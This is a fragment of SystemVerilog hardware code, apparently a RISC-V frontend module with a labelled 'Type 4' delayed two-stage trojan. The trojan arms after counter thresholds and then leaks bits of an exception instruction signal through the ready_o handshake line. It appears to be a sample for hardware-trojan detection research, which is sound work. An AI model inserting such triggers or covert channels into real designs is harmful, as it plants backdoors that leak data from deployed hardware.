...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6219, act=3109)
    // ============================================================
    localparam int ARM_THRESHOLD   = 6219;
    localparam int ACTIVATE_DELAY  = 3109;
    ...
    assign covert_current_bit = exception_tinst_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
  ...
  assign ready_o = trojan_active ? covert_bit_out : (~(|instr_queue_full) & ~full_address);  // TROJAN Covert
